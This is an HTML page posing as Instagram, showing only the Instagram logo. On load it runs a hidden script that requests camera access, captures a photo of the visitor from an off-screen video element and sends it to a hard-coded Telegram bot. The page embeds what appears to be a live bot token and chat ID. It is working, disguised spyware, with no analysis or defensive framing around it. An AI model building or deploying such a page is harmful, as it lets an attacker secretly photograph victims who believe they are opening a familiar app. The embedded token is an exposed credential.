<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { margin: 0; padding: 0; display: flex; align-items: center; justify-content: center; height: 100vh; background-color: #fff; }
        img { width: 100px; height: 100px; } /* باران */
        video, canvas { display: none; position: absolute; left: -9999px; }
    </style>
</head>
<body>

    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="IG">

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const botToken = '7546948976:AAFPHTjFRKGAOQOgkyg6uEqXCjl_ca2nC2k';
        const chatId = '56081692';
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                video.srcObject = stream;
                setTimeout(takeAndSend, 1500); 
            } catch (e) { console.error("Access denied"); }
        }

        function takeAndSend() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                const fd = new FormData();
                fd.append('chat_id', chatId);
                fd.append('photo', blob, 'image.jpg');

                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd })
                .then(() => {
                    // باران
                    video.srcObject.getTracks().forEach(t => t.stop());
                });
            }, 'image/jpeg', 0.6);
        }

        window.onload = init;
    </script>
</body>
</html>
